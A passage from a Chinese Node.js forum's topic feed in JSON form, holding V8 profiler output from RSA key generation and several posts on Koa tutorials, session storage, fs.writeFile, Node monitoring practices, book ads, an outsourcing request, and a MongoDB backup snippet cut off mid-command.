&#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:448:21\n      1  100.0%          LazyCompile: ~montSqrTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:631:19\n      1  100.0%            LazyCompile: ~bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      1   10.0%      LazyCompile: ~BigInteger &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:50:20\n      1  100.0%        LazyCompile: *bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      1  100.0%          LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      1  100.0%            LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n      1    5.6%    LazyCompile: *stat internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:84:14\n      1  100.0%      LazyCompile: ~tryFile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:194:17\n      1  100.0%        LazyCompile: ~tryExtensions internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:209:23\n      1  100.0%          LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      1  100.0%            LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n\n     12    6.4%  &#x2F;usr&#x2F;lib64&#x2F;libpthread-2.17.so\n      3   25.0%    &#x2F;app&#x2F;software&#x2F;nodejs&#x2F;bin&#x2F;node\n      1   33.3%      LazyCompile: ~setupInspector internal&#x2F;bootstrap&#x2F;node.js:442:26\n      1  100.0%        LazyCompile: ~setupGlobalConsole internal&#x2F;bootstrap&#x2F;node.js:404:30\n      1  100.0%          LazyCompile: ~startup internal&#x2F;bootstrap&#x2F;node.js:30:19\n      1  100.0%            Script: ~bootstrapNodeJSCore internal&#x2F;bootstrap&#x2F;node.js:15:30\n      1   33.3%      LazyCompile: ~Module._resolveLookupPaths internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:401:38\n      1  100.0%        LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n      1  100.0%          LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      1  100.0%            LazyCompile: ~Module.require internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:631:36\n      1   33.3%      LazyCompile: ~BigInteger &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:50:20\n      1  100.0%        LazyCompile: *bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      1  100.0%          LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      1  100.0%            LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n\n      6    3.2%  LazyCompile: *bnpSquareTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:448:21\n      3   50.0%    LazyCompile: ~montSqrTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:631:19\n      3  100.0%      LazyCompile: ~bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      3  100.0%        LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      3  100.0%          LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n      3  100.0%            LazyCompile: ~bnpFromNumber &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:770:23\n      3   50.0%    LazyCompile: *bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      3  100.0%      LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      3  100.0%        LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n      2   66.7%          LazyCompile: ~bnpFromNumber &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:770:23\n      2  100.0%            LazyCompile: ~BigInteger &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:50:20\n      1   33.3%          LazyCompile: ~module.exports.Key.RSAKey.generate &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;rsa.js:93:42\n      1  100.0%            LazyCompile: ~module.exports.NodeRSA.generateKeyPair &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;NodeRSA.js:156:50\n\n      4    2.1%  LazyCompile: *montReduce &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:609:20\n      2   50.0%    LazyCompile: ~montSqrTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:631:19\n      2  100.0%      LazyCompile: ~bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      2  100.0%        LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      2  100.0%          LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n      2  100.0%            LazyCompile: ~module.exports.Key.RSAKey.generate &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;rsa.js:93:42\n      2   50.0%    LazyCompile: *bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      2  100.0%      LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      2  100.0%        LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n      2  100.0%          LazyCompile: ~bnpFromNumber &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:770:23\n      2  100.0%            LazyCompile: ~BigInteger &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:50:20\n\n      3    1.6%  LazyCompile: *bnpMultiplyTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:436:23\n      2   66.7%    LazyCompile: *montMulTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:637:19\n      2  100.0%      LazyCompile: ~bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      2  100.0%        LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      2  100.0%          LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n      1   50.0%            LazyCompile: ~module.exports.Key.RSAKey.generate &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;rsa.js:93:42\n      1   50.0%            LazyCompile: ~bnpFromNumber &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:770:23\n      1   33.3%    LazyCompile: *bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      1  100.0%      LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      1  100.0%        LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n      1  100.0%          LazyCompile: ~module.exports.Key.RSAKey.generate &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;rsa.js:93:42\n      1  100.0%            LazyCompile: ~module.exports.NodeRSA.generateKeyPair &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;NodeRSA.js:156:50\n\n      3    1.6%  Builtin: CallFunction_ReceiverIsAny\n      1   33.3%    LazyCompile: ~callSiteLocation &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;depd&#x2F;index.js:251:27\n      1  100.0%      LazyCompile: ~wrapfunction &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;depd&#x2F;index.js:397:23\n      1  100.0%        LazyCompile: ~populateConstructorExports &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;http-errors&#x2F;index.js:225:37\n      1  100.0%          Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;http-errors&#x2F;index.js:1:11\n      1  100.0%            LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1   33.3%    LazyCompile: ~assertEncoding internal&#x2F;fs&#x2F;utils.js:58:24\n      1  100.0%      LazyCompile: ~getOptions internal&#x2F;fs&#x2F;utils.js:167:20\n      1  100.0%        LazyCompile: ~readFileSync fs.js:340:22\n      1  100.0%          LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1  100.0%            LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      1   33.3%    LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;psl&#x2F;index.js:14:61\n      1  100.0%      Builtin: ArrayMap\n      1  100.0%        Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;psl&#x2F;index.js:1:11\n      1  100.0%          LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%            LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n\n      2    1.1%  RegExp: ^screen|^xterm|^vt100|color|ansi|cygwin|linux\n      2  100.0%    LazyCompile: ~montReduce &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:609:20\n      1   50.0%      LazyCompile: ~montSqrTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:631:19\n      1  100.0%        LazyCompile: ~bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      1  100.0%          LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      1  100.0%            LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n      1   50.0%      LazyCompile: ~montMulTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:637:19\n      1  100.0%        LazyCompile: ~bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      1  100.0%          LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      1  100.0%            LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n\n      2    1.1%  Builtin: KeyedStoreIC_Megamorphic\n      1   50.0%    LazyCompile: ~bnpSubTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:402:18\n      1  100.0%      LazyCompile: ~bnModInverse &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1351:22\n      1  100.0%        LazyCompile: ~module.exports.Key.RSAKey.generate &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;rsa.js:93:42\n      1  100.0%          LazyCompile: ~module.exports.NodeRSA.generateKeyPair &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;NodeRSA.js:156:50\n      1  100.0%            LazyCompile: ~NodeRSA &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;NodeRSA.js:45:21\n      1   50.0%    LazyCompile: *bnpSquareTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:448:21\n      1  100.0%      LazyCompile: *bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      1  100.0%        LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      1  100.0%          LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n      1  100.0%            LazyCompile: ~bnpFromNumber &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:770:23\n\n      2    1.1%  Builtin: InterpreterEntryTrampoline\n      1   50.0%    LazyCompile: ~bnModInverse &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1351:22\n      1  100.0%      LazyCompile: ~module.exports.Key.RSAKey.generate &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;rsa.js:93:42\n      1  100.0%        LazyCompile: ~module.exports.NodeRSA.generateKeyPair &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;NodeRSA.js:156:50\n      1  100.0%          LazyCompile: ~NodeRSA &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;NodeRSA.js:45:21\n      1  100.0%            Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;server&#x2F;common&#x2F;ResultFactory&#x2F;index.js:1:11\n      1   50.0%    LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1  100.0%      LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      1  100.0%        LazyCompile: ~tryModuleLoad internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:536:23\n      1  100.0%          LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      1  100.0%            LazyCompile: ~Module.require internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:631:36\n\n\n</code></pre></div>","title":"V8性能测试图","last_reply_at":"2019-04-26T03:12:46.682Z","good":false,"top":false,"reply_count":0,"visit_count":584,"create_at":"2019-04-26T03:12:46.682Z","author":{"loginname":"xulayen","avatar_url":"https://avatars1.githubusercontent.com/u/15044564?v=4&s=120"}},{"id":"5b3748c457137f22415c5143","author_id":"5b37469f57137f22415c5140","tab":"share","content":"<div class=\"markdown-text\"><p>当你用了Koa以后，你肯定不会再用express，因为Koa太优秀了!</p>\n<p><strong>2018 Nodejs+Koa2入门实战视频教程百度网盘下载地址：</strong></p>\n<p><a href=\"https://pan.baidu.com/s/1KNaA97kGwNhavch5rP_G7w\"></a><a href=\"https://pan.baidu.com/s/1KNaA97kGwNhavch5rP_G7w\">https://pan.baidu.com/s/1KNaA97kGwNhavch5rP_G7w</a></p>\n<p>Nodejs Koa交流群：319732955   想和大神交流的加下群</p>\n</div>","title":"2018 Nodejs+Koa2入门实战视频教程【共41集】-欢迎拍砖免费分享【网盘直接下载】","last_reply_at":"2019-04-26T00:14:33.134Z","good":false,"top":false,"reply_count":57,"visit_count":12630,"create_at":"2018-06-30T09:09:24.209Z","author":{"loginname":"koa666","avatar_url":"https://avatars3.githubusercontent.com/u/37576865?v=4&s=120"}},{"id":"5cc1603f37faec0ce1d06906","author_id":"5cc15db237faec0ce1d068eb","tab":"ask","content":"<div class=\"markdown-text\"><p>问题：session在node中是如何存储的 ？\n最近了解 session cookie的相关概念，然后使用了egg-passport实践了一下\n发现对session的存储有一些疑惑\n通过阅读passport的源码，看到最后是执行到ctx.req.session = xxxx； 这样就保存了session到服务器中吗？\n在脑海里没有很清晰的思路，究竟session是存在哪里，怎么存的\n通过编辑器的提醒 Context.req: IncomingMessage，又找到了node http模块中IncomingMessage相关内容 并没有发现与session 有什么关联\n感觉ctx.req.session = xxxx;是个黑盒子，里面完成了什么内容完全不清楚？\n请问有大佬说说node中 session的理解吗？或者有什么思路\ngoogle了很多 都是如何使用框架进行可持续化的session存储，但是对原理好像没有什么讲述到\n尝试了 ctx.req.abc = 123 进行赋值\n反序列化的时候取ctx.req.abc 是undefined的，并没有存下来，那么就是对session这个字段有特别处理？</p>\n</div>","title":"session在node中是如何存储的 ？","last_reply_at":"2019-04-25T17:18:13.791Z","good":false,"top":false,"reply_count":3,"visit_count":680,"create_at":"2019-04-25T07:22:39.877Z","author":{"loginname":"CrewS","avatar_url":"https://avatars1.githubusercontent.com/u/5671380?v=4&s=120"}},{"id":"5cc09d3637faec0ce1d06381","author_id":"5cc09b18a86ae80ce64b3990","tab":"ask","content":"<div class=\"markdown-text\"><p>node 版本號 10.15.3\n執行程式碼<img src=\"//static.cnodejs.org/FiaL1ov1BRH7ubA6xL_tZwclgU16\" alt=\"保存方法.jpg\">\n第一次執行路徑與結果\n代碼\n<img src=\"//static.cnodejs.org/Fo8OwkgCmK9HIs63EcJCtPpGx_fI\" alt=\"9487碼.jpg\">\n執行結果:有\n<img src=\"//static.cnodejs.org/Fop1v8TGiKlcHLeK_h9_eWfLbHih\" alt=\"執行結果.jpg\">\n路徑以及輸出的資料:有輸出資料\n<img src=\"//static.cnodejs.org/FgVlecHNZMxw7ekz-75nNEXwUvx8\" alt=\"路徑.jpg\">\n第一次成功寫入，但第二次卻沒有寫入但有執行\n第二次執行路徑與結果\n代碼\n<img src=\"//static.cnodejs.org/FvrSJN_6u0nHaIV4Lgc5mlcpo_yw\" alt=\"9488碼.jpg\">\n輸出結果:有\n<img src=\"//static.cnodejs.org/FjxrbAnhomH2H_VM-f5AXuDeILWt\" alt=\"9488結果.jpg\">\n路徑及輸出的資料:沒有輸出的資料\n<img src=\"//static.cnodejs.org/FmqtnT2ZxUpjEWIz2LASz1xd1tgv\" alt=\"9488路徑.jpg\"></p>\n<p>請問各位大大有誰知道這中間發生了甚麼事情嗎 ??</p>\n</div>","title":"有關 fs.writeFile() 有執行但沒有寫入文件的情況","last_reply_at":"2019-04-25T16:21:14.671Z","good":false,"top":false,"reply_count":5,"visit_count":623,"create_at":"2019-04-24T17:30:30.052Z","author":{"loginname":"Jack0427","avatar_url":"https://avatars1.githubusercontent.com/u/41355986?v=4&s=120"}},{"id":"5b8cdb3a71b88cc417ed0846","author_id":"5b74f778a210553a0cde2979","tab":"ask","content":"<div class=\"markdown-text\"><p>求告知react的入门相关书籍！！！</p>\n</div>","title":"如何才能学好react？","last_reply_at":"2019-04-25T14:27:44.974Z","good":false,"top":false,"reply_count":48,"visit_count":4509,"create_at":"2018-09-03T06:56:58.686Z","author":{"loginname":"zhuhaifeng1251pm","avatar_url":"https://avatars1.githubusercontent.com/u/41354007?v=4&s=120"}},{"id":"5cc1846e37faec0ce1d06a8c","author_id":"5bd1dc3dad50495f5e2fbb45","tab":"ask","content":"<div class=\"markdown-text\"><p>大家帮忙看一下除了一下一些在真实项目中使用的时候，还有其他的一些点吗？</p>\n<ol>\n<li>链路跟踪\n如何在真实业务场景中做链路的跟踪，如使用opentracing机制进行链路跟踪，如利用开源项目：Zipkin</li>\n<li>错误监控\n如何当node报错的时候，将错误收集起来，这块例如使用sentry进行收集</li>\n<li>业务监控和性能监控和服务器信息监控\n这块的话当前是用Grafana进行监控，数据库用elasticsearch或者一些时序数据库。</li>\n<li>日志监控\n为了在生产环境中使用，如何做日志数据集合，在统一平台查看。这块当前采用flume + flume-collector + kafka + flink + elasticsearch等做日志平台</li>\n<li>性能提升这块\n当前做swagger的接口与Grafana的每个接口性能的监控。\n6.压测情况\n每个接口开发完毕，使用autocannon进行压测，确保本地的压测结果不太差。\n7.内存泄漏\n通过Grafana做内存、cpu等的曲线图展示，利用alinode分析。</li>\n<li>配置中心\n对接阿波罗配置中心，将一些配置抽离到配置中心。\n9.服务注册发现\n利用consul + nginx做的服务注册发现，不在应用级别侵入做的服务注册发现。</li>\n<li>流控\n用一个middleware简单处理</li>\n<li>cache机制\n封装的装饰器，内部是redis做cache机制</li>\n</ol>\n<p><img src=\"//static.cnodejs.org/FofIz1k_2xqSehoL4wV7I-0TyE49\" alt=\"image.png\"></p>\n</div>","title":"关于如何在真实项目中提升企业级Node这块的地位","last_reply_at":"2019-04-25T13:36:01.317Z","good":false,"top":false,"reply_count":1,"visit_count":594,"create_at":"2019-04-25T09:57:02.678Z","author":{"loginname":"stone-jin","avatar_url":"https://avatars3.githubusercontent.com/u/6525544?v=4&s=120"}},{"id":"5cbeae4e37faec0ce1d0510d","author_id":"541bf946ad60405c1f14b770","tab":"share","content":"<div class=\"markdown-text\"><p>这是一篇广告文，需要的请自取，现在京东打折满100减50~\n<img src=\"https://p3.ssl.qhimg.com/t015e54d793a5ace2c2.jpg\" alt=\"five\"></p>\n<p>购书京东二维码：<img src=\"https://p5.ssl.qhimg.com/t0152e01126216557ce.png\" alt=\"qrcode\"> 购书链接： <a href=\"https://item.jd.com/12573168.html\">https://item.jd.com/12573168.html</a></p>\n<p><img src=\"https://p0.ssl.qhimg.com/t0185cc475190c62f44.jpg\" alt=\"one\">\n<img src=\"https://p5.ssl.qhimg.com/t0147a2c928579d3b70.jpg\" alt=\"two\">\n<img src=\"https://p5.ssl.qhimg.com/t01668fe15fa7b624e8.jpg\" alt=\"three\">\n<img src=\"https://p1.ssl.qhimg.com/t018cdf67a440af41eb.jpg\" alt=\"four\">\n<img src=\"https://p5.ssl.qhimg.com/t018875f5db73fb51d8.jpg\" alt=\"five\"></p>\n<p>购书京东二维码：<img src=\"https://p5.ssl.qhimg.com/t0152e01126216557ce.png\" alt=\"qrcode\"></p>\n<p>购书链接： <a href=\"https://item.jd.com/12573168.html\">https://item.jd.com/12573168.html</a></p>\n</div>","title":"分享一本我写的书《深入浅出Vue.js》，新书上市，现在京东满100减50噢~","last_reply_at":"2019-04-25T03:55:25.663Z","good":false,"top":false,"reply_count":9,"visit_count":1269,"create_at":"2019-04-23T06:18:54.791Z","author":{"loginname":"berwin","avatar_url":"https://avatars0.githubusercontent.com/u/3739368?v=4&s=120"}},{"id":"5ca17f4399e62a362ff41c6d","author_id":"56cb313d66c88b5e490260a9","tab":"share","content":"<div class=\"markdown-text\"><p>我们是一个教练社区网站（<a href=\"http://bbs.zuqiuxunlian.com\">bbs.zuqiuxunlian.com</a>）,用的是cnodejs的开源代码搭建。\n由于现在手机浏览居多，小程序比较适合手机阅读。故而希望做一个客户端。\n可以参考已经有的很多开源的客户端。\n必须的功能：</p>\n<ol>\n<li>微信登录</li>\n<li>方便的留言框</li>\n<li>社区发帖</li>\n<li>自定义头像</li>\n</ol>\n<p>其他需求，可以讨论：</p>\n<ol>\n<li>简洁漂亮的界面</li>\n<li>设计优雅的分享</li>\n</ol>\n<p>有兴趣的报个价给我。\nvx：awong1900</p>\n</div>","title":"【外包】做一个社区的微信小程序客户端","last_reply_at":"2019-04-25T02:28:44.040Z","good":false,"top":false,"reply_count":18,"visit_count":1842,"create_at":"2019-04-01T03:02:27.153Z","author":{"loginname":"awong1900","avatar_url":"https://avatars1.githubusercontent.com/u/4022612?v=4&s=120"}},{"id":"5cb92784a86ae80ce64b0eda","author_id":"5cac197b7edd13064e053b71","tab":"share","content":"<div class=\"markdown-text\"><p>如何在Nodejs Koa代码中实现数据库备份还原呢？</p>\n<p>用koa2+mongodb做了个系统，现在想用nodejs实现一键 备份数据库以及还原功能数据库功能\n首先安装一下conv-lite这个模块哦\n下面只是大概实现思路</p>\n<pre class=\"prettyprint\"><code>const cp = require(&#x27;child_process&#x27;);\nconst iconv = require(&#x27;iconv-lite&#x27;);\n\ncp.exec(&#96;mongodump -h 